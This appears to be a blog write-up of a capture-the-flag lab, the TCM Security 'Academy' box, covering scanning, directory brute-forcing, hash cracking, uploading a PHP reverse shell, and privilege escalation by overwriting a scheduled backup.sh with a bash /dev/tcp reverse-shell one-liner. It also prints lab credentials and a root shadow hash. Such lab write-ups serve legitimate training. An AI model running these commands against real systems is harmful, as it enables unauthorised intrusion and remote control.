# TCM-Security-s-PEH-Capstone-project-Lab-Academy
Solved the CTF lab by performing reconnaissance, scanning, and vulnerability analysis to identify security flaws. Exploited the target system to gain initial access, then used enumeration and privilege escalation techniques to capture all flags successfully.

Target IP: 192.168.1.108

Nmap Scan:

nmap -Pn -A -p- 192.168.1.10
Press enter or click to view image in full size

Enumeration:
FTP:
We use nmap service version and default script scan.

Press enter or click to view image in full size

We found something called note.txt on the ftp. Lets try to login anonymously and get the file.

We see some details about database.

Press enter or click to view image in full size

HTTP:
First thing first, lets check robots.txt and sitemap.xml.

Press enter or click to view image in full size

Nothing found, just get Apache/2.4.38 version. sitemap.xml is the same.

Let try with nmap version detection,

Press enter or click to view image in full size

Same result.

Try brute-forcing the directories using ffuf and gobuster.

ffuf -w /usr/share/wordlists/dirb/big.txt -u <http://192.168.1.108/FUZZ>

gobuster dir -u 192.168.1.1 -w /usr/share/wordlists/dirb/big.txt
Press enter or click to view image in full size

Findings:
21/tcp open ftp vsftpd 3.0.3 — Anonymous FTP login allowed

*22/tcp open ssh SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2*

80/tcp open http Apache httpd 2.4.38 ((Debian))

jdelta — user and some Database info.

some directory: /academy, /phpmyadmin, /server-status

and a note.txt where we find database info

Exploitation:
FTP
We also find a hash from the note.txt. Let’s work with that right now,

cd73502828457d15655bbd7a63fb0bc8

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
The hash is student.

Student ID: 10201321

Password: student

HTTP
We can now try the ID and PASSWORD in the academy directory.

Get Sondip Roy’s stories in your inbox
Join Medium for free to get updates from this writer.

Enter your email
Subscribe
We can see there is an upload option. We can try to upload a reverse shell file here.

Press enter or click to view image in full size

We are using a php-reverse-shell. Start listening with our attacker machine and upload the file.

Press enter or click to view image in full size

We are now www-data users. We need to escalate our permission.

We are using Linpeas for privilege escalation.

We download linpeas on our local machine and host a web server then download it from our local machine to the target machine.

We need to give linpeas.sh execute permission then run it.

We found a user named “grimmie” who is in administrator group.


We found a password in the /var/www/html/academy/includes/config.php file

Press enter or click to view image in full size

After seeing the file, we found mysql_username: grimmie, mysql_pass: My_V3ryS3cur3_P4ss.

Press enter or click to view image in full size

We try to log into mysql database but failed. Let’s use ssh

Press enter or click to view image in full size

We successfully log into grimmie. If we check for files we can see a backup.sh some kind of script is here.


Maybe this is some kind of task or process running on the machine. But we don’t get any kind of information from crontabs or systemctl list-timers,

Press enter or click to view image in full size

We can use a tool called pyps64 a linux process monitoring tool. Lets download and use this.

This tool will monitor all the process running on this server.

Press enter or click to view image in full size

We can see that backup.sh is a process running and using /bin/bash.

We can use a reverse shell and reverse the backup.sh file so that the process execute our shell.

bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
When we wait for the process to execute we will get the shell.

Press enter or click to view image in full size

We got our flag.

Others:
We try to get access of the data base using grimmie .

mysql -u grimmie -p //My_V3ryS3cur3_P4ss
show databases; //we are using mysql
use mysql;
show tables;
select * from user
We found all the users and there password.

Root’s /etc/shadow:

$6$ahtry9roVl5oY1fo$V87.ZOyfRA9cGeRawFky4jnS03RJeC6xqEYM5RmSzMABjzYtvAPiZtp0eRwdyj3qUoPhA2ZYD40h/nC6G0PnB.: tcm

We can now log into the root using ssh directly.
